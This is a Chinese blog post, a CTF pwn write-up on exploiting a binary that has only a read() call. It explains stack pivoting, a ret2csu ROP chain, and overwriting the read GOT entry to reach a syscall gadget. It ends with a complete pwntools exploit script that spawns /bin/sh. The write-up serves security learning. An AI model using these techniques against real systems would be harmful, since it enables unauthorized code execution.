<!-- build time:Fri Dec 22 2023 22:20:09 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="は永遠に不滅である" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="は永遠に不滅である" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="は永遠に不滅である" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Pwn"><link rel="canonical" href="http://example.com/CTF/Pwn/solutions/learn/read/"><title>一个只有read的程序 - 题解 - Pwn - CTF | Pwn&4riH04X = は永遠に不滅である = 击碎你沉睡的灵魂！</title><meta name="generator" content="Hexo 7.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">一个只有read的程序</h1><div class="meta"><span class="item" title="创建时间：2023-11-17 10:38:07"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-11-17T10:38:07+08:00">2023-11-17</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>4.6k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>4 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Pwn&4riH04X</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="/images/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li><li class="item" data-background-image="/images/large/6833939bly1gicljgocqbj20zk0m8e81.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/Pwn/" itemprop="item" rel="index" title="分类于 Pwn"><span itemprop="name">Pwn</span></a><meta itemprop="position" content="2"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/Pwn/solutions/" itemprop="item" rel="index" title="分类于 题解"><span itemprop="name">题解</span></a><meta itemprop="position" content="3"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/CTF/Pwn/solutions/learn/read/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="4riH04X"><meta itemprop="description" content="击碎你沉睡的灵魂！, 我们从不回头"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="は永遠に不滅である"></span><div class="body md" itemprop="articleBody"><p></p><meta name="referrer" content="no-referrer"><p></p><p>​	近期都很忙，突发奇想在二进制✌（）的引导下想完成这一道所谓的中等题😊😊😊（<strong>在这之前补充一下，聊到了凌晨 4 点，现在身心俱疲。</strong>）</p><p>此前一直做一些简单的板子题度日，堆只看不碰，栈只挑简单的做，真的可恶啊！</p><h2 id="1read原程序"><a class="anchor" href="#1read原程序">#</a> 1.read 原程序</h2><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231117102300363.png" alt="image-20231117102300363" style="zoom:50%"> <img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231117102325207.png" alt="image-20231117102325207" style="zoom:50%"></p><p>​	只有一个 read，明显栈溢出，至于怎么溢出，额，待会细琐。当然这里一眼看过去，shellcode 是最好想到的啊，我们简单看看保护和 vmmap 看看有没有</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231117103156728.png" alt="image-20231117103156728"></p><p></p><figure class="highlight bash"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解释</span><br><span class="line">64位程序，小端序</span><br><span class="line">开启部分RELRO-----got表仍可写</span><br><span class="line">未开启canary保护-----存在栈溢出</span><br><span class="line">开启NX保护-----堆栈不可执行              其实这里没必要看vmmap了，算了熟悉一下指令吧</span><br><span class="line">未开启PIE-----程序地址为真实地址</span><br><span class="line">动态链接</span><br></pre></td></tr></table></figure><p></p><p>​	显然，这里没有像静态链接程序固定带有的 mprotect 函数，可以去修改内存页的权限为<span class="label"> rwxp</span>，（再调用 read 函数将 pwntools 生成的 shellcode 代码注入到 addr 中，之后再将 read 函数返回地址写为 addr 地址，调用 shellcode，获得 shell），而且就算可以改，也没办法泄露 addr，这个想法被 pass 了。</p><h2 id="2一个可行的idea-拓展到栈上的ret2dl"><a class="anchor" href="#2一个可行的idea-拓展到栈上的ret2dl">#</a> 2. 一个可行的 idea - 拓展到栈上的 ret2dl</h2><p>以前只是见过，今天来实操一下。😋，当然 t1d 说这个题用它做不出来。</p><h3 id="ret2dl介绍"><a class="anchor" href="#ret2dl介绍">#</a> ret2dl 介绍</h3><p>​	对于 NO RELRO 的情况，我们可以利用 read 函数修改 <code>.dynamic</code> 段中的 <code>.dynstr</code> 节的地址，将其修改为我们可控制的地址。然后我们可以在这个地址上构造一个伪造的 <code>fake_dynstr</code> ，将其中的某个字符串替换为 <code>system</code> 函数的字符串。</p><p>​	接下来，我们可以调用 <code>.dl_fixup</code> 函数，它会解析我们修改的字符串所对应的原函数。 <code>_dl_fixup</code> 函数根据字符串（也就是函数名）来索引函数，因此最终会解析 <code>system</code> 函数。</p><p>​	无论是 32 位还是 64 位，实现这个过程都相对简单。具体步骤如下：</p><p></p><figure class="highlight bash"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到.dynamic段并获取.dynstr节的地址（STRTAB的d_ptr）。</span><br><span class="line">使用<span class="built_in">read</span>函数将.dynstr的地址修改为我们可控制的地址。</span><br><span class="line">在可控制的地址上构造一个fake_dynstr，将其中的某个字符串替换为system函数的字符串。</span><br><span class="line">调用.dl_fixup函数，它会解析我们修改的字符串所对应的原函数，即system函数。</span><br></pre></td></tr></table></figure><p></p><p>注：如果是 <code>FULL RELERO</code> ，程序在运行之前就已经调用了 <code>ld.so</code> 将所需的外部函数加载完成，程序运行期间不进行动态加载，因此，在程序的 <code>got</code> 表中， <code>link_map</code> 和 <code>dl_runtime_resolve</code> 函数的地址都为 <code>0</code></p><p>可以参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxODY4MzM2L2FydGljbGUvZGV0YWlscy8xMTQ2NDQ1Njk=">【精选】ret2dlresolve 超详细教程 (x86&amp;x64)-CSDN 博客</span></p><h3 id="本题的具体实践"><a class="anchor" href="#本题的具体实践">#</a> 本题的具体实践</h3><p>​	显然，除了上述方法中通过调用 <code>system(&quot;/bin/sh&quot;)</code> 和打 <code>one_gadget</code> 来 <code>getshell</code> 以外，还有一种常见方式就是通过触发 syscall 软中断来 getshell，然而，本题的 ELF 源文件中并没有 <code>syscall</code> 这个 <code>gadget</code> ，并且，我们又无法泄露 libc 信息，用 libc 中的 <code>syscall</code> ，因此，我们需要想办法创造出 <code>syscall</code> 这个 gadget。</p><p>​	在 t1d 的指引下，我去回顾了一遍 read,write 这些函数。参考文章：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMDYwMTQyMzQ=">ctf 中关于 syscall 系统调用的简单分析 - 知乎 (zhihu.com)</span></p><p></p><figure class="highlight text"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">read()：</span><br><span class="line">  ssize_t read(int fd,const void *buf,size_t nbytes); </span><br><span class="line">  //fd 为要读取的文件的描述符  0</span><br><span class="line">  //buf 为要读取的数据的缓冲区地址 </span><br><span class="line">  //nbytes 为要读取的数据的字节数</span><br><span class="line"></span><br><span class="line">  //read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf，</span><br><span class="line"> //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。</span><br><span class="line"></span><br><span class="line">write() </span><br><span class="line">  ssize_t write(int fd,const void *buf,size_t nbytes);</span><br><span class="line">  //fd 为要写入的文件的描述符  1 </span><br><span class="line">  //buf 为要写入的数据的缓冲区地址</span><br><span class="line">  //nbytes 为要写入的数据的字节数 </span><br><span class="line"></span><br><span class="line"> //write() 函数会将缓冲区 buf 中的 nbytes 个字节写入文件 fd，</span><br><span class="line"> //成功则返回写入的字节数，失败则返回 -1。</span><br></pre></td></tr></table></figure><p></p><p>​	其实，在 libc 中，read，write，close，alarm 等等这些函数只是对系统调用进行了简单的封装，在这些函数中都存在 syscall 这个 gadget，且 syscall 一般离函数的开始地址都很近，故可以将这些函数的 got 表改为 syscall 的地址，从而触发系统调用。</p><p>同样我们可以具体看看 ida 里面 read 的汇编：本题的不知道为啥没显示 syscall，显示的是 call😋，下面是博客里的，看着更清晰一点。</p><p><img data-src="https://gitee.com/murry_ari/murray/raw/master/images/image-20231117110943517.png" alt="image-20231117110943517"></p><p></p><figure class="highlight text"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将read的系统调用号 0 赋值给 rax</span><br><span class="line">将 read的第一个参数0 （fd） 赋值给了 rdi</span><br><span class="line">将 read的第二个参数 buf 赋值给了 rsi</span><br><span class="line">将 read的第二个参数 buf 赋值给了 rdx</span><br><span class="line">即系统调用了 read(0,&amp;buf,0x400)</span><br></pre></td></tr></table></figure><p></p><p>​	😋, 要是所有题目都可以直接去把 read 的 got 表改成 syscall，再修改参数执行就好了（）</p><p>​	好了，我们知道，在 64 位中，要想成功 getshell，需要控制的寄存器如下：</p><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = <span class="number">0x3b</span></span><br><span class="line">rdi = bin_sh_addr</span><br><span class="line">rsi = <span class="number">0</span></span><br><span class="line">rdx = <span class="number">0</span></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p></p><p>​	因此针对本题的思路如下：</p><p>​	我们可以用 ret2csu 先改写 read 的 got 表为 syscall 的地址，有了 syscall 后，再由 read 读入的字节数控制 rax 寄存器（同时读入 /bin/sh 字符串），并用 ret2csu 控制 rdi，rsi，rdx 三个参数，最后调用触发 syscall 即可。t1d 说的大致相同，那我先去实搓了，回来接着写，万一还有坑，做不出来就是🤡了。</p><p>2023-11-17 10:53:07</p><hr><p>2023-11-18 19:31:07</p><h2 id="3小丑归来"><a class="anchor" href="#3小丑归来">#</a> 3. 小丑归来🤡</h2><p>本题目的难点在栈迁，，，，（对我这个菜🐕来说）</p><p>​	断断续续鏖战 1 天，在师傅的敲打下，该碰的坑都碰，先总结得失：</p><p><strong>1. 做题要动态调试</strong>，一下午可能跑了两三次吧，画表格布栈、打草稿，等等，这些都不如动调来的快</p><p>2. 栈迁移的技巧：直接把返回地址写成 read 的 <code>lea rax, [rbp+buf]</code> ，把 rbp 改成想迁移到的地址，这个地址有考究，待会认真说。</p><p>3. 巧妙利用 read 实现任意写，布链子。</p><p><strong>待会说，自闭了，板子题只是基础，要多见新题，基础打牢，多调题目。</strong></p><p>整体来说，对这个 “简单” 的做法还是存在一些疑惑，等弄懂了回来更新。</p><h3 id="1栈迁移"><a class="anchor" href="#1栈迁移">#</a> 1）栈迁移</h3><p>一些学习的博客：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWklLSDI2L2FydGljbGVzLzE1ODE3MzM3Lmh0bWw=">栈迁移的原理 &amp;&amp; 实战运用 - ZikH26 - 博客园 (cnblogs.com)</span></p><p>哎，少看，多实践</p><p>针对本题具体的是迁移到 read 的虚拟栈，em，还要再学习一下回来具体补充</p><h3 id="2rop链"><a class="anchor" href="#2rop链">#</a> 2）ROP 链</h3><p>像 ret2syscall 一样，直接调用 read_plt</p><h3 id="3用csu改got"><a class="anchor" href="#3用csu改got">#</a> 3）用 csu 改 got</h3><p>当然这里是和 4 结合在一起的，用 read 控制输入为 0x3b 调节 rax 实现改 got 同时调用 syscall 的作用</p><h2 id="4exp"><a class="anchor" href="#4exp">#</a> 4.exp</h2><p></p><figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#seccomp-tools dump ./pwn.pwn看哪些被禁用了</span></span><br><span class="line"><span class="comment">#栈劫持就是先讨论main函数里的栈迁移，首先利用溢出把ebp的内容给修改掉（修改成我们要迁移的那个地址）</span></span><br><span class="line"><span class="comment">#并且把返回地址填充成leave;ret指令的地址（因为我们需要两次leave;ret）</span></span><br><span class="line"><span class="comment">#execve：59号系统调用  execve(&quot;/bin/sh&quot;,0,0) r12中填入exceve的地址，其余寄存器置0。</span></span><br><span class="line"><span class="comment">#希望控制寄存器为：</span></span><br><span class="line"><span class="comment">#rax = 0x3b syscall</span></span><br><span class="line"><span class="comment">#rdi = bin_sh_addr</span></span><br><span class="line"><span class="comment">#rsi = 0</span></span><br><span class="line"><span class="comment">#rdx = 0</span></span><br><span class="line"><span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn.pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn.pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2csu的两个gadget</span></span><br><span class="line"><span class="comment">#loc_4011B6: pop_rbx_addr</span></span><br><span class="line">gadget1_addr = <span class="number">0x4011ba</span></span><br><span class="line"><span class="comment">#loc_4011A0: mov_rdx_r14_addr </span></span><br><span class="line">gadget2_addr = <span class="number">0x4011A0</span> </span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义利用csu的通用gadget函数</span></span><br><span class="line"><span class="comment">#rdi,rsi,rdx</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">com_gadget</span>(<span class="params">addr1 , addr2 , jmp2 , arg1 , arg2 , arg3</span>):</span><br><span class="line">	payload = p64(addr1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(arg1) + p64(arg2) + p64(arg3) + p64(jmp2) + p64(addr2) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">	<span class="comment"># csu =   pop_rbx_addr , rbx ,  rbp ,     r12 ,         r13 ,      r14 ,       r15 ,  mov_rdx_r14_addr 56个对应那几个pop</span></span><br><span class="line">	<span class="keyword">return</span> payload </span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#1核心是两次leave_ret</span></span><br><span class="line"><span class="comment">#迁移栈：到read的虚拟栈</span></span><br><span class="line"><span class="comment">#ret</span></span><br><span class="line">ret = <span class="number">0x4040c0</span>+<span class="number">0xa0</span></span><br><span class="line"><span class="comment">#leave_ret</span></span><br><span class="line"><span class="comment">#read的jmp指令地址</span></span><br><span class="line">leave_ret = <span class="number">0x401132</span></span><br><span class="line"><span class="comment">#rbp放回去的地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa0</span> <span class="comment">#覆盖到返回地址</span></span><br><span class="line">payload += p64(ret) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#2ROP链条</span></span><br><span class="line"><span class="comment">#调用syscall</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4011c1</span></span><br><span class="line"><span class="comment">#参数1的地址0x404200</span></span><br><span class="line"><span class="comment">#参数2：0</span></span><br><span class="line"><span class="comment">#调用修改后的read-&gt;syscall</span></span><br><span class="line">payload = p64(pop_rsi_r15)+p64(<span class="number">0x404200</span>)+p64(<span class="number">0</span>)+p64(read_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3调用read修改got表       0x404200-&gt;binsh  0   0</span></span><br><span class="line">payload += com_gadget(gadget1_addr, gadget2_addr, read_got, <span class="number">0x404200</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#栈迁到read_got的位置并执行leave_ret-&gt;read</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;a&#x27;</span>)+ p64(read_got+<span class="number">0xa0</span>) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.控制read的读入字节控制rax，实现syscall</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3b</span>-<span class="number">8</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p></p><h2 id="5更新"><a class="anchor" href="#5更新">#</a> 5. 更新</h2><div class="tags"><a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-11-18 21:11:06" itemprop="dateModified" datetime="2023-11-18T21:11:06+08:00">2023-11-18</time> </span><span id="CTF/Pwn/solutions/learn/read/" class="item leancloud_visitors" data-flag-title="一个只有read的程序" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="4riH04X 微信支付"><p>微信支付</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>4riH04X <i class="ic i-at"><em>@</em></i>は永遠に不滅である</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/CTF/Pwn/solutions/learn/read/" title="一个只有read的程序">http://example.com/CTF/Pwn/solutions/learn/read/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/%E6%A8%A1%E6%9D%BF/" itemprop="url" rel="prev" data-background-image="&#x2F;images&#x2F;large&#x2F;6833939bly1giciryrr3rj20zk0m8nhk.jpg" title="写作模板"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 博客说明</span><h3>写作模板</h3></a></div><div class="item right"><a href="/CTF/Pwn/note/Pwn%E9%A2%98%E5%9E%8B/" itemprop="url" rel="next" data-background-image="&#x2F;images&#x2F;large&#x2F;6833939bly1gicis081o9j20zk0m8dmr.jpg" title="常见漏洞"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 笔记</span><h3>常见漏洞</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1read%E5%8E%9F%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">1.read 原程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E4%B8%80%E4%B8%AA%E5%8F%AF%E8%A1%8C%E7%9A%84idea-%E6%8B%93%E5%B1%95%E5%88%B0%E6%A0%88%E4%B8%8A%E7%9A%84ret2dl"><span class="toc-number">2.</span> <span class="toc-text">2. 一个可行的 idea - 拓展到栈上的 ret2dl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dl%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">ret2dl 介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98%E7%9A%84%E5%85%B7%E4%BD%93%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.2.</span> <span class="toc-text">本题的具体实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%B0%8F%E4%B8%91%E5%BD%92%E6%9D%A5"><span class="toc-number">3.</span> <span class="toc-text">3. 小丑归来🤡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">3.1.</span> <span class="toc-text">1）栈迁移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2rop%E9%93%BE"><span class="toc-number">3.2.</span> <span class="toc-text">2）ROP 链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E7%94%A8csu%E6%94%B9got"><span class="toc-number">3.3.</span> <span class="toc-text">3）用 csu 改 got</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4exp"><span class="toc-number">4.</span> <span class="toc-text">4.exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E6%9B%B4%E6%96%B0"><span class="toc-number">5.</span> <span class="toc-text">5. 更新</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/CTF/Pwn/solutions/learn/read/" rel="bookmark" title="一个只有read的程序">一个只有read的程序</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="4riH04X" data-src="/images/avatar.jpg"><p class="name" itemprop="name">4riH04X</p><div class="description" itemprop="description">我们从不回头</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">15</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL001MjExMQ==" title="https:&#x2F;&#x2F;github.com&#x2F;M52111"><i class="ic i-github"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS9tamtvLTg1" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;mjko-85"><i class="ic i-zhihu"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjgwNTIyMjU1NEBxcS5jb20=" title="mailto:805222554@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/%E6%A8%A1%E6%9D%BF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/CTF/Pwn/note/Pwn%E9%A2%98%E5%9E%8B/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/" title="分类于 博客说明">博客说明</a></div><span><a href="/%E5%86%99%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" title="基于HEXO的写博客tips">基于HEXO的写博客tips</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 